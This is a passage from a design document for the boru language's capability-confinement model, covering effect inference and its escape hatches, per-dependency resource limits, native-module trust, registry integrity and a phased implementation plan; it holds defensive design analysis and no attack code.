  same struct plus a union pass up the same fixpoint*, not a new analyzer.

**The soundness boundary is a short, nameable list of escape hatches** — all of
them specific words the analyzer already knows about:

| Escape hatch | Why hard | Conservative handling |
|---|---|---|
| `do`/`each`/`fold`/`scan` of a **computed / received body**, or `apply` of a **non-lexical Function value** | body/callee not statically known | over-approx to the ambient grant, or require an effect annotation |
| `word`-splice (`__SP`) of a computed body | same | same |
| `import` of a **computed** name | breaks transitive enumeration | over-approx / forbid computed import |
| `Vm.run` / `Vm.run-with` of an arbitrary **string** | parses + runs anything | already runs under a *sub-policy*, so bounded to that composed grant |
| Macros | compile-time codegen | analyse **post-expansion** (`macro_expand.go` runs before the checker walks) |
| computed `get` / dot-access of a word by computed key | dynamic dispatch | over-approx / annotation |

Literal quotations, literal word refs, literal imports, and
lambdas-with-literal-bodies (closures the checker already handles via capture
analysis) are all walkable — the common case, and the *only* case pure `-util`
libraries exercise. `do [add 1 1]` is fully analysable *because the body is an
inert-const literal*; the compiler already draws exactly this line, baking a
code-body word "only when its bodies are INERT consts" (`carrier.go`). See §7.4
for the `do` case in full.

**Two properties make the trade-off acceptable:**

1. **Analyzability is itself a capability.** Every escape hatch is a
   capability-gated word, so a grant that withholds `do`-of-nonliteral /
   `apply`-of-opaque / `vm` / computed-`import` *makes the analysis both sound
   and precise* by removing the hard cases. You need not soundly analyse
   `Vm.run` in a module that cannot call it. A strict `pure`/`deterministic`
   profile
   denies the reflective words and collapses the dynamic surface to zero.
2. **The grant is the backstop — the security property never depends on the
   analysis.** Even an *opaque* `do <computed>` can only dispatch words in the
   current registry, so its reach is bounded by the module's *effective grant*,
   not by "anything." In a module granted `{}`, an opaque `do` still reaches
   `{}` — every capability word it might name is denied at runtime regardless.
   Dynamic dispatch therefore degrades only the *tightness of the inferred
   manifest*, never the confinement. Inference exists to *verify a declared set
   is tight* (a DX/audit benefit); it is not what enforces the boundary.

**Transitivity** is enumerable iff imports resolve statically — literal import
string ⇒ walk it; computed import ⇒ over-approximate or forbid; data-file
imports (`.json`/`.csv`) contribute no code and are trivially pure. **Native
modules are inference leaves:** their Go cannot be inferred from boru, so each
carries a *trusted, attested capability summary* (once — the native set is
small, fixed, and compile-time-sealed, §9.1). The boru-source interior is
inferred; the native leaves are labelled; the fixpoint closes. This
presupposes a *pinned* dependency graph, which today's registry does not yet
provide (§9.3).

**Static vs. dynamic.** A dynamic capability trace (run under a recording
policy that logs every `Check` — the dry-run mode of PERMISSIONS.10) discovers
a *tight* candidate set for exercised paths, but is **unsound** (covers only
executed paths). The productive pattern is: dynamic trace to *propose* a
manifest, static analysis to *prove it is an over-approximation*.

**Verdict.** The purity/reachability verdict is highly feasible, sound, and
buildable on shipped machinery — a real guarantee for the boru-source graph.
Precise effect sets are best-effort: dynamic-eval-heavy code either annotates
or over-approximates to its grant, which the design tolerates because the
importer gates the actual grant regardless. The design should therefore lead
with reachability/purity, treat precise inference as best-effort-with-
annotations, and expose "analyzable" as a capability a strict profile can
require.

### 7.4 Worked case: when is `do [body]` analysable?

`do` is the clearest lens on §7.3 because it is boru's general "run this code"
word, and the intuition "`do [add 1 1]` is obviously fine" is exactly right —
the question is *where the line falls*. `do`'s code-body signature is
`{Args:[TList], NoEvalArgs:{0:true}, ReturnsFn: doListReturnsFn,
CompileEffect: CompileFallbackBody}` (`native_control.go`): the body is *not*
evaluated before `do` sees it, the checker computes `do`'s result by walking
the body (`doListReturnsFn` → `RunCarrierBody`), and the compiler islands the
body **only when it is an inert const**. Both the type result and the
capability set fall out of the same body walk — so analysability is governed by
one question: *can the analyzer see the body as a known sequence of resolvable
words?*

The knowability lattice, most-to-least analysable:

| Form | Example | Analysable? |
|---|---|---|
| Syntactic inert-const literal | `do [add 1 1]` | **Yes, precisely** — identical to inlining `add 1 1`; body walked, effect set = `{}` |
| Literal referencing in-scope names | `do [x add 1]`, `do [IO.read p]` | **Yes** — names resolve in the checker's scope; effects = union of the resolved words (here `{fileops.read}`) |
| Literal with its own locals/params | `do [def y 5  y add 1]` | **Yes** — self-contained; walked as a carrier body |
| Name bound once to a literal | `def b [add 1 1]  do b` | **Usually** — needs def-substitution: feasible when the checker tracks `b`'s concrete value and `b` is not reassigned / shadowed / a parameter; degrades to "List of unknown code" otherwise |
| Computed list | `do (concat [add] [1 1])` | **Only if constant-foldable** — a pure fold to a known list is analysable; a general computation is not |
| Received / opaque value | `do (args.0)`, `do (read "x.boru" …)` | **No** — only the *type* (`List`) is known, not the *code*; over-approximate to the module's grant |

`do [add 1 1]` is trivial precisely because the body is `[Word(add), 1, 1]` —
an inert const whose single word is a pure core arithmetic op — so
`doListReturnsFn` infers `Integer` and the capability walk yields `{}`. The
boundary is **not** "is the argument written as `[...]`?" but "**can the
analyzer prove the body is an inert constant whose element words are all
statically resolvable?**" — the exact predicate the compiler already applies
for `CompileFallbackBody` islanding. Cases 1–3 satisfy it; cases 4–6 are the
degradation, and per §7.3 they degrade the inferred manifest to the ambient
grant, not the confinement. Note the analyzer cannot tell `do [literal]` from
`do computed` at the *signature* level (both match `[TList]`); the distinction
is made by the body walk, and "a `do` whose body I could not prove inert-const"
is precisely the diagnostic a strict profile turns into a
declare-or-fail requirement.

### 7.5 Worked case: `apply` and higher-order dispatch

`apply` is the sharper sibling of `do`. Where `do`'s argument is *code as
data* (a list, often literally visible), `apply`'s argument is a **first-class
Function value** taken off the stack and invoked against the preceding args
(`args… fn/r apply`, `native_ref.go`). A Function value carries its whole
`FnDefInfo` — signature, body, and captured bindings — so *if the analyzer
holds the concrete value, it holds everything needed to compute the callee's
effects*. The analysis question is therefore pure **provenance**: does the
analyzer know *which* fn reaches this `apply`?

The checker already answers this for the lexical cases. `apply`'s `[TFunction]`
signature carries `ReturnsFn: ReturnsIdentity(0)`: in check mode it re-steps the
concrete fn value *exactly as runtime would*, recording an ordinary `CALL_USER`
— done specifically so the bytecode compiler can lower higher-order dispatch. So
a known callee is analysed as a direct call, effects and all.

The provenance lattice:

| Callee source | Example | Analysable? |
|---|---|---|
| `/r`-ref to a named fn / lambda literal | `5 inc/r apply`, `f/r apply` | **Yes, precisely** — re-stepped as a direct call to `inc`; effects = `inc`'s |
| Locally-built closure to a nearby `apply` | `def g (x => [x IO.read]) … g/r apply` | **Yes** — the closure's body + captures travel with the value (capture analysis) |
| Branch over a bounded set of refs | `(if c a/r b/r) apply` | **Yes, by join** — union the candidate callees' effects (`a` ∪ `b`) |
| Fn from a dispatch table | `ops.handler/r apply` | **Only if the table is statically known** (literal map of lambdas ✓; populated at runtime ✗) |
| Fn received as a parameter / from an opaque module | `[f:Function] … f apply` | **No** — callee identity unknown; over-approximate to the grant |

The crucial difference from `do`: an *opaque* `apply` is not exotic
metaprogramming, it is the **ordinary higher-order idiom** — callbacks,
comparators threaded through `sort`, strategy tables, visitors. First-class
functions exist precisely to be passed, stored, and selected at runtime, so the
unknown-callee case is common, not a corner. Reachability/purity analysis must
treat any module that `apply`s a non-lexical value as "reaches its full grant"
unless the value's provenance is annotated.

**The higher-order twist unique to `apply` — capability leakage via closures.**
A Function value can be *constructed in one capability context and applied in
another*: a privileged module builds a closure that captures a fileops-reaching
word and hands it to a `pure` module, which does `cb/r apply`. Whose authority
does the closure run with — the constructor's or the applier's? Because dispatch
and capability-gating happen against the **live (applying) registry**
(`execFnDefLiteral` runs the body's words there, and the capability slots /
`HostPolicy` consulted are that registry's), the governing rule is **the
applier's effective grant, not the captured authority**. That is the sound
object-capability result — no ambient authority leaks through a passed value —
**but only if the applying registry's slots are attenuated to the applier's
grant**. Under the proposed per-edge attenuation (§5–§6) a privileged closure
applied inside a `pure` module reaches `{}` and the capture is inert. Under
today's inherit-all behaviour (§3.4), the child inherited the parent's wrapped
slots and `CapPolicy` was not propagated, so an applied closure *can* reach the
parent's capabilities — authority leaks. `apply` is the natural vector for that
leak, which makes it a concrete, security-motivated argument for prioritising
per-edge attenuation.

As with `do`, the confinement backstop still holds for the *analysis*: an opaque
`apply` in a module granted `{}` reaches `{}` regardless of the callee, so
dynamic dispatch degrades manifest *tightness*, not the boundary — the one
caveat being the closure-leakage vector above, which is about getting the
*slot attenuation* right, not the inference.

### 7.6 Worked case: `Vm.run` — the hatch that inverts the trade-off

`Vm.run` is the maximal escape hatch on the *code-analyzability* axis and the
**minimal** one on the *risk* axis — and understanding why is the clearest
statement of this whole section's thesis. Its argument is a **`String`**
(`vm-run` sig `{Args:[TString]}`), parsed and executed at runtime, so there is
not even an AST to walk: the code is opaque *by construction*, strictly less
analyzable than `do`'s list or `apply`'s Function value.

But `Vm.run` is the only one of the three hatches that **carries its own
capability boundary**. `runInSubEngine` (`modules/vm.go`) does not run the
string in the current registry — it builds a **fresh** registry under
`effective = Compose(parentPolicy, childProfile)` and runs the code there:

```go
effective := pol                                   // pol = built-in "sandbox" for Vm.run
if parentPol := native.HostPolicy(parent); parentPol != nil {
    effective = policy.Compose(parentPol, pol)     // ⊆ parent, structurally
}
subReg, _ := newSubEngineRegistry(parent, effective)
```

So the site's capability footprint is a function of the **policy** (data the
analyzer can often read), *not* the **code** (text it never can). This inverts
the intuition: the most dynamic hatch is the one you reason about most cleanly,
and it degrades to something *tighter than the ambient grant* rather than up to
it. Contrast the three:

| Hatch | Runs in | Opaque-input footprint |
|---|---|---|
| `do <opaque>` | current registry | up to the **full module grant** |
| `apply <opaque>` | current registry | up to the **full module grant** |
| `Vm.run <any string>` | fresh sub-registry under `Compose(grant, sandbox)` | at most **`sandbox ∩ grant`** — strictly tighter |

Precision by variant:

| Variant | Sub-policy | Site footprint |
|---|---|---|
| `Vm.run` / `-sandbox` / `-compute` | fixed built-in profile | **precise** — `Compose(grant, sandbox|compute)`, regardless of the string |
| `Vm.run-with code {literal policy}` | literal map in source | **precise** — `Compose(grant, literal)`; the literal policy is an *inline capability manifest for the dynamic sub-program* |
| `Vm.run-with code {computed policy}` | computed | over-approximate to `grant` (Compose caps at the parent regardless) — same worst case as `do`/`apply`, still ⊆ grant, never ⊤ |
| `Vm.parse` / `Vm.check` / `Vm.compile` | — (analyse, don't run) | **`{}`** — check mode suppresses every side-effecting handler, so these are effect-free whatever the string |

Two further points close it:

- **Analyzability-as-capability, in its sharpest form.** `Vm.run` requires the
  module to have imported `boru:vm`, which the `modules` import scope gates. A
  `pure`/`deterministic` profile that denies `boru:vm` makes the entire hatch
  *unreachable* — there is nothing to analyse because the module cannot call it.
- **A dangerous *string* is itself gated.** An interesting string (one that
  drives I/O) generally has to be obtained via `read`/`fetch` — separate,
  analyzable, gated capabilities. The content is opaque; the provenance of a
  *harmful* string is not free.

**Residual risk (honest).** The sub-engine inherits the kernel governors (step
limit, tape ceiling), so a runaway body is bounded — but `MaxSubEngineDepth` is
unenforced (§3.6) and `newSubEngineRegistry` does not read `pol.Limits()`, so
**nested `Vm.run` is unbounded** (a Go-stack DoS vector) and a
`Vm.run-with {limits:…}` declares budgets that do not bite. Closing this is the
depth-counter + limits-wiring work of §6.1/§8.2. The per-group step budget
recorded above is a third instance of the same shape — a declared bound that
does not compose — and should be closed with them. And, per §9.2, this is
in-process attenuation, not OS isolation against truly hostile code.

**The synthesis.** `Vm.run` is not merely a hatch to worry about — it is the
*template* for the entire per-edge model. Importing a dependency and running it
under `Compose(importer, dep-grant)` (§5–§6) **is** `Vm.run-with` applied at the
dependency boundary. The right posture for genuinely untrusted dynamic code is
therefore not `do`/`apply` at ambient authority, but the `Vm.run` model: run
arbitrary code under a *declared, reduced, composed* grant that travels with it.
The one hatch you cannot statically analyse is the one that shows how dynamic
code *should* enter — which is why the design generalises it to every import
edge.

### 7.7 The milder hatches

The three worked cases above are boru's general dispatch primitives; the
remaining ways source can run code the analyzer cannot see are milder — each
either reduces to a case above or is narrower.

**(a) Higher-order collection words** — `each` / `fold` / `scan` / `filter` /
`map` / `select` / `group` / … Each accepts *either* a `NoEvalArgs` code body
*or* a `TFunction` value: `filter`, for instance, carries both
`{TList, TAny}` (NoEvalArgs body → `filterBodyHandler`) and `{TFunction, TAny}`
(fn value → `filterHandler`), sharing one `ReturnsFn: filterReturnsFn` and
`CompileEffect: CompileFallbackBody` (`natives.go`). So they are **hybrids of
`do` and `apply`**: the body form is the §7.4 case (walked with the
element/accumulator type threaded onto the body stack), the fn-value form is the
§7.5 provenance lattice. Idiomatically the argument is *always* a source literal
(`each [body]`, `filter [pred]`) — you rarely write `each storedBody` — so they
are analysable by construction even more reliably than `do`. No new surface;
just the union of the two prior cases, precise in the common case.

**(b) Computed `import`** — the transitivity-specific hatch. `import` evaluates
its argument (`AsConcreteString` / `AsConcreteAtom`), so `import "boru:math"`
(literal — the universal idiom) is a statically resolvable *edge*, while
`import <computed>` defeats static enumeration of the transitive graph. Two
mitigations: (i) it is still gated at runtime by the `modules` import scope, so
`import <computed>` resolving to a non-allowlisted module is denied — *security*
is preserved, only static *enumeration* is lost; (ii) require literal imports in
analysable/strict modules — a trivial syntactic check (is the import argument a
source literal?) that removes the hatch for any module wanting a verified
transitive manifest. This is the transitivity analogue of
"analyzability is a capability."

**(c) Macros** — analysed post-expansion, so no runtime blind spot. boru macros
are a *quote-template* surface (`defmacro` = `fn` + auto-`NoEvalArgs` +
expand-time splice; the template is a `quote […]` region with `unquote` /
`splice`), expanded by a deterministic, hygiene-renaming walker whose output
tokens are spliced into the call site (`macro_expand.go`). Because expansion
runs at parse/compile time *before* the effect walk, **the checker analyses the
expanded code** — a macro expanding to `IO.read` contributes `{fileops.read}`
to the site. The one wrinkle is *expand-time* effects: an `unquote
(effectful-expr)` runs during expansion — a compile-time surface distinct from
runtime, and the boru analogue of the build-script attacks Tratt cites (the
"install every Python library" experiment). It is rare, discouraged, gated the
same way if expansion runs under a policy, and a strict profile can additionally
require macro unquotes to be pure. Macros do not defeat *runtime* capability
inference.

**(d) Computed `get` / dynamic field dispatch** — collapses into `apply`.
`m get k` with a computed key is *data access*, not effect dispatch — unless the
retrieved value is a capability-bearing fn that is then `apply`d, or a module
export selected by computed key (`IO get name`). Both are bounded: you can only
`get` exports of a module you have already (gated) imported, and applying the
result is the §7.5 case under the applier's grant. No new surface.

**Why the taxonomy being *closed* is the whole point.** Every way boru source can
dispatch code the analyzer cannot statically see reduces to a **finite, named,
individually gate-able list**: `do`-body, `apply`-value, `Vm.run`-string,
computed-`import`, macro-expand, computed-`get`. Each has a conservative
handling (§7.3) and each is reachable only through a capability a strict profile
can withhold. This closedness is precisely what makes *sound over-approximation
achievable* — and it is the structural difference from a native language, where
Tratt's escape hatch is *every pointer and every instruction*, an open set no
analysis can enumerate. In boru the dynamic surface is small enough to list on
one line, which is why "prove this module reaches no capability" is a decidable
question rather than a hopeful one.

### 7.8 Operationalizing it: the `analyzable` constraint

§7.3–7.7 establish that boru's dynamic surface is a closed, gate-able list. This
subsection turns that into a concrete constraint an importer can *require* of a
dependency — **`analyzable`**: a static / publish-time mode under which a
module's capability footprint is *provably* inferable because every escape hatch
is either resolved or forbidden. A module built under `analyzable`:

- **may not import `boru:vm`** (removes `Vm.run` / `run-with`, §7.6), enforced by
  the `modules` import allowlist;
- **must use literal `import` arguments** (removes computed import, §7.7b) — a
  syntactic checker rule;
- **must let the checker prove every `do` / `apply` / `each` / `fold` /
  `filter` body-or-callee inert-const-or-lexical** (§7.4/7.5/7.7a); an
  unresolvable one is a *declare-or-fail* diagnostic — the module either makes
  it analysable or declares the widened footprint;
- **must keep macro `unquote`s pure** (removes expand-time effects, §7.7c).

A module that passes carries a **statically-verified** manifest
(`declared ⊇ inferred`, tightly). Compose that with the **`pure`** grant (`{}`)
and the module is *provably* capability-free — the strongest guarantee, and
exactly what an importer wants of a transitive dependency it will not audit.

Three clarities keep it honest:

- **`analyzable` is orthogonal to the capability subsets** (§7.1). It is not a
  runtime scope like `fileops`; it constrains the *shape of the code* so the
  effect set is inferable, and is enforced at `boru check` / publish, not at the
  `Check()` gate. The subsets say *what* a module may do; `analyzable` says
  *that we can prove what it does*. A module can be `analyzable` yet non-`pure`
  (it verifiably uses `{fileops.read}`).
- **You do not need `analyzable` for safety.** The runtime grant confines a
  non-analysable module to its grant regardless (§7.3, the backstop);
  `analyzable` buys *tightness and verification* — a diffable manifest (§4.3)
  and the confidence to default-deny transitives instead of over-granting.
- **It composes.** An importer can require "every transitive dependency is
  `analyzable` and granted ⊆ `read-only`" — the practical policy for an
  untrusted subtree.

---

## 8. boru-specific resource limits — the quantitative capability axis

Tratt's model is about *what* a dependency may do. It is silent on *how much* —
yet a purely-computational dependency with zero capabilities can still wedge or
exhaust the host (a `sort` that never terminates, a transform that splices the
tape without bound). boru already has the governors to prevent this; this note
makes them **per-dependency and transitively attenuating**, a second capability
axis orthogonal to allow/deny.

### 8.1 Resource bounds as attenuating capabilities

The `Limits` block (§3.6) — `TimeoutMs`, `MaxStepBudget`, `MaxStackDepth`,
`MaxMemoryBytes`, `MaxOutputBytes`, `MaxSubEngineDepth` — is a *quantitative*
grant. Its composition semantics are already the right ones:
`Compose(...).Limits()` takes the **min-non-zero of each field**, i.e. the more
restrictive bound wins, folded down the chain. So a dep's effective budget is
`min(importer's, dep's declared, dep's per-edge grant)` — exactly the transitive
attenuation of §6, applied to numbers instead of scopes. A parent with a 1 M
step budget cannot be handed 10 M by a child; a child can only ever tighten.

The module manifest carries a `limits` block alongside `requires`:

```jsonic
capabilities: {
  subset: "pure"
  limits: { maxStepBudget: 200000, maxMemoryBytes: 8388608 }  // this lib is small
}
```

### 8.2 Wiring the declared limits into the enforced governors

The gap (§3.6) is that `Limits` is declared/composed/displayed but **never
enforced**. Closing it, per field:

| Field | Enforcement path (proposed) | Difficulty |
|---|---|---|
| `MaxStepBudget` | production setter on `Engine.stepLimit`, applied per sub-engine at `newSubEngineRegistry`; the Run loop already meters steps | **low** — the loop exists |
| **tape ceiling** (`MaxMemoryBytes`) | `reg.TapeConfig` is already per-registry; give a child a stricter `TapeConfig` derived from the composed limit. Bytes→entries needs a `÷160` translation against the entry ceiling | **low–med** — knob exists, needs translation |
| `MaxSubEngineDepth` | a depth counter threaded through `runInSubEngine` / import, checked against the composed value (default 8) | **low** |
| `MaxOutputBytes` | meter `r.Output`/`r.ErrOutput` writers (output is unscoped today) | **med** — new metering |
| `TimeoutMs` | a `context` deadline cooperatively checked at the step counter (no wall-clock governor exists today; the async `timeout` word is unrelated) | **med** — new mechanism |
| `MaxStackDepth` | a distinct value-stack-depth check (only the tape/VM ceiling exists today) | **med** |

The tape ceiling is the cleanest first win: it is *already* per-registry, so a
child module can be given a smaller tape than its parent with a one-field
change, immediately bounding a runaway dependency's memory to, say, 8 MB while
the host keeps its 64 MB.

### 8.3 Determinism as a capability

Denying `clock` and the `rand` seed makes a dependency's execution
**reproducible** — valuable for supply-chain auditing (same input ⇒ same
behaviour ⇒ diffable) and as the precondition for the
[EOP report](legacy/effect-oriented-programming-in-boru-report.0.ignore)'s `with-handler`
testing story. Two known leaks must be closed first (§9.4): `TimeUtil.sleep` /
`timeout` / `interval` / `elapsed` and `boru:test` bypass `EffectiveClock` and
call `time.*` directly, so a "no clock" grant is not yet airtight.

The end state for a pure algorithm dependency: **`{}` capabilities + a bounded
tape/step budget + no clock/rand** ⇒ it cannot exfiltrate, cannot hang, cannot
OOM, and cannot even observe wall-time. That is total confinement of an
untrusted transitive dependency, at the cost of a hashtable lookup per word —
Tratt's aspiration, minus the hardware.

---

## 9. The native-module boundary — honest limits

Matching Tratt's own candour ("sometimes we have to accept that all the
trade-offs available to us are unpalatable"), this section states exactly what
the model does *not* cover.

### 9.1 Native modules are the trusted computing base

Everything in §2–§8 confines **boru-source** modules. A **native/Go** module —
anything reached via `import "boru:<name>"` through the static compile-time
`modules` map, or registered by a host via `(*Boru).Register` /
`RegisterNativeFunc` / `RegisterExternalBuiltin` / `ExtensionPayload` — is
arbitrary Go. It runs with the process's full authority (files, network, exec,
memory) and Tratt's original argument applies to it *in full*. Policy gates
whether a native module is **imported** (`modules.Resolve`), but once loaded its
Go executes unsandboxed; the fine-grained wrappers only gate the *host
capabilities* it chooses to route through, not what its Go can do directly.

The one structural mitigation is real and worth stating: **boru is "sealed at
compile time"** ([GO-MODULES.10](GO-MODULES.10.md)) — no FFI, no dynamic
loading, no plugin `.so`. "The host registration list is the trust boundary."
A third party cannot inject a native module at runtime; the native tier is
fixed when the `boru` binary is built and is auditable in one place. So the trust
model is a **two-tier graph**:

- a **small, fixed, build-time-audited native TCB** (the interpreter + the
  compiled-in native modules), where trust must be scarce and manual — and *is*,
  because it is small and changes rarely; and
- an **open-ended, structurally-confined boru-source dependency graph** above it,
  where trust is cheap because it is enforced, not extended.

This is a defensible answer to Tratt: don't try to secure an unbounded native
graph (his conclusion that this is "fundamentally incompatible with security");
instead keep the native graph tiny and fixed, and make the *unbounded* part of
the graph interpreted and confined.

### 9.2 In-process, not OS isolation

Per PERMISSIONS.10: in-process capability confinement is **defence in depth for
moderately untrusted code, not a substitute for OS isolation against truly
hostile input.** A deployment taking genuinely adversarial boru should *also* run
the host under a container with seccomp, a read-only rootfs, and net-namespace
isolation. Side channels (timing, cache) are out of scope — an OS/hardware
concern.

### 9.3 Distribution integrity is a prerequisite

A capability manifest is only meaningful if the artifact it rides on is
integrity-checked, and today the `install`/`import` path has **no signing, no
lockfile, no content hash** — `boru install` fetches a zip from whatever registry
URL `-r` names, checked only for size and zip-slip; `deps` records only
`name→version`. A different registry can serve arbitrary bytes under any
`name-version`. The [boru-vendor.0](boru-vendor.0.md) design already specifies the
right shape for the *separate* vendored-source axis — a `vendor.lock` pinning a
resolved commit SHA and a canonical Merkle `tree` hash, `--frozen`
reproducibility, and future sigstore `--require-signed`. **This note recommends
adopting the same model on the module-registry path**, so that a module's
declared capabilities and its code are pinned *together*: the capability diff of
§4.3 is only trustworthy if the bytes are content-addressed and (ideally)
signed. Without this, a manifest is advisory; with it, the manifest + code are a
single verifiable, attributable unit.

### 9.4 Known leaks to close

- **By-reference shared state (§3.4).** Pointer-backed payloads (`Store`,
  `Array`, `Map`) shared across the import boundary are a mutation channel — a
  dependency handed a shared `Store` can mutate what the parent observes.
  Attenuation must hand down *attenuated wrappers* and treat shared mutable
  payloads as a covert-channel surface.
- **Clock is leaky.** `sleep`/`timeout`/`interval`/`elapsed` and `boru:test`
  bypass `EffectiveClock`; a "no clock" grant is not airtight until these route
  through the injectable clock.
- **`env`/`process`/`system-info` are taxonomy-ahead-of-surface.** The scopes
  and globals exist but no boru word reads an env var, spawns a process, or reads
  system info yet; the gates are scaffolding. When those words land, they must
  route through the scopes on day one.
- **`Limits` enforcement is a stub** (§3.6) — until wired, every declared
  budget is inert. (The per-export gate, §3.2, was wired by NUR045 on
  2026-08-02 and is live on both engines.)

---

## 10. Implementation sketch (phased)

Each phase ends green (`make fmt && vet && lint && test`) and is independently
shippable, matching the PERMISSIONS-PLAN.10 discipline.

- **Phase 0 — finish the substrate (mostly plumbing).** Standardize on
  `Compose`; delete/deprecate `RequireSubset` usage. Wire the per-export gate
  (`checkModuleCall` → real call site). Enforce `MaxSubEngineDepth` (depth
  counter). Wire `MaxStepBudget` and the per-registry tape ceiling from
  `policy.Limits`. *(No new concepts; closes the §3 gaps.)*
- **Phase 1 — the manifest.** `capabilities.{requires,subset,limits}` block in
  `boru.jsonic` → `.boru/boru.json`; read at module load; undeclared ⇒ deny;
  resolve the "absent" sentinel at one boundary.
- **Phase 2 — per-edge attenuation.** `RunModuleBody` (and native-module
  install) install `effective`-parameterized wrappers instead of inheriting;
  propagate `CapPolicy` to child sub-registries; importer `with { … }` override
  and/or a per-dep grant block. Reuse `boru:vm`'s `Compose` path.
- **Phase 3 — static verification** (feasibility analysed in §7.3–7.8).
  `Effects []string` on signatures; union fixpoint in the carrier checker
  (EOP idea #1, on the existing `FnSummaries` / `CompileEffect` machinery);
  `boru check` verifies declared ⊇ inferred; `--emit-capabilities` writes the
  manifest; the escape-hatch handling of §7.4–7.7 (over-approximate or
  declare-or-fail at `do`/`apply`/`Vm.run`/computed-`import`/macro sites); the
  `analyzable` publish-mode of §7.8; `-util` purity as a checked invariant.
- **Phase 4 — well-known subsets.** Named per-module subset vocabulary
  (`pure`/`deterministic`/`read-only`/`compute`/`client`); importer
  default-subset-for-all-transitive-deps policy.
- **Phase 5 — distribution integrity.** Content-hash + lockfile + optional
  signature on the module-registry path (adopt the vendor.lock model), so
  manifest + code are pinned together.
- **Phase 6 — the rest of the `Limits` axis.** `TimeoutMs` deadline,
  `MaxOutputBytes` metering, `MaxStackDepth`; close the clock leaks for a real
  `deterministic` subset.

Phases 0–2 deliver the core: real transitive attenuation with a manifest.
Phase 3 is what makes the manifest *trustworthy* rather than *claimed* — the
single highest-value item for the supply-chain story.

---

## 11. Prior art

| System | Relation to this design |
|---|---|
| WebAssembly component model / WASI | Tratt's own cited "partial solution to performance"; capabilities as explicit imports. boru lands the same idea at the interpreter layer, with cheaper cell boundaries and a static checker over its *own* source. |
| Deno permissions | Declarative, syscall-family scoping; process-wide. boru is finer (per-module, per-word) and in-process. The "no runtime grant/revoke" lesson is shared. |
| E / object-capability languages | The no-ambient-authority, capabilities-are-not-forgeable model boru implements via wrapped slots. |
| CHERI compartments (Tratt) | Hardware capability pointers; powerful but temporally fragile. boru trades hardware generality for interpreter-enforced simplicity and no first-class capability values to leak. |
| Newspeak / Wyvern / Austral capability-safe modules | Language-level capability-safe imports; closest kin. boru adds a static effect-inference *verifier* over an existing checker. |
| Go build-time sealing | The native-TCB-fixed-at-build-time property (§9.1). |
| AppArmor / AWS IAM / `pledge` | The glob rules, last-match-wins, and bounding-set (global hard-cap) shapes boru's policy already borrows. |

boru's distinctive claim is not any single mechanism but their *composition*: no
ambient authority + cheap in-process cells + declarative attenuating policy +
a static effect checker, applied to the boru-source dependency graph, with a
small sealed native TCB underneath.

---

## 12. Open questions

1. **Manifest granularity.** Scope-level (`fileops`) vs. op-level
   (`fileops.read`) vs. `where`-level (`path in [...]`)? Start op-level; allow
   `where` for `fileops`/`network`.
2. **Ask-exceeds-offer arbitration.** When a dep's declared ask exceeds the
   importer's default grant: fail-closed (import error), silently narrow, or
   prompt at `boru install`? Lean fail-closed with an explicit `with { … }`
   opt-in.
3. **Native-module capability declaration.** A native module can *declare* a
   footprint but cannot be *verified* (§9.1). Attest it (signature + a
   host-registration allowlist) rather than trust the declaration; surface it in
   `describe` so importers see which deps are native (unverifiable) vs.
   boru-source (verifiable).
4. **Effect-inference precision** (analysed in depth in §7.3–7.8). The dynamic
   surface is a closed, gate-able list — `do`-body, `apply`-value,
   `Vm.run`-string, computed-`import`, macro-expand, computed-`get` — each with
   a conservative handling and a runtime-grant backstop. The residual open
   question is narrower: *which* of these the default `analyzable` mode should
   forbid outright versus over-approximate-with-annotation, and how aggressively
   to invest in def-value tracking (the `do name` / `apply name` case,
   §7.4/7.5) before falling back to the grant bound.
5. **Shared mutable payloads (§9.4).** Are by-reference `Store`/`Array` exports
   a capability in their own right (a "mutate-parent-state" grant)? Possibly they
   should be copied at attenuated edges despite the cost.
6. **Is per-edge import just `vm.run-with` sugar?** (§5.3) If the semantics are
   identical, implement once and expose `import … with` as the surface.
7. **Multi-parent deps.** A dep imported by two parents with different grants:
   distinct attenuated instances per edge (safe, duplicated) vs. one instance at
   the join (must be the *intersection*)? Lean per-edge instances.

---

## See also

- [PERMISSIONS.10](PERMISSIONS.10.md) — the implemented host-side policy model
  this extends (note the `RequireSubset`→`Compose` and enforcement corrections in
  §3).
- [IMPORTS.10](IMPORTS.10.md), [NATIVE-MODULES.10](NATIVE-MODULES.10.md) — the
  import path and module system the manifest/attenuation hook into.
- [FILE-ACCESS.10](FILE-ACCESS.10.md) — the `FileOps` capability the wrapping
  pattern generalises.
- [effect-oriented-programming-in-boru-report.0](legacy/effect-oriented-programming-in-boru-report.0.ignore)
  — idea #1 (static effect inference) is the verification mechanism of §7.
- [boru-vendor.0](boru-vendor.0.md) — the integrity/lockfile/signing model §9.3
  recommends adopting for the module path.
- [GO-MODULES.10](GO-MODULES.10.md) — the compile-time-sealed native TCB (§9.1).
- [TAPE-DATA-STRUCTURE.10](legacy/TAPE-DATA-STRUCTURE.10.ignore),
  [RESOURCE-SAFETY.0](RESOURCE-SAFETY.0.md) — the tape ceiling and resource
  bounds of §8.
- Laurence Tratt, [*Can We Retain the Benefits of Transitive Dependencies
  Without Undermining Security?*](https://tratt.net/laurie/blog/2024/can_we_retain_the_benefits_of_transitive_dependencies_without_undermining_security.html)
  (2025) — the essay this note answers.
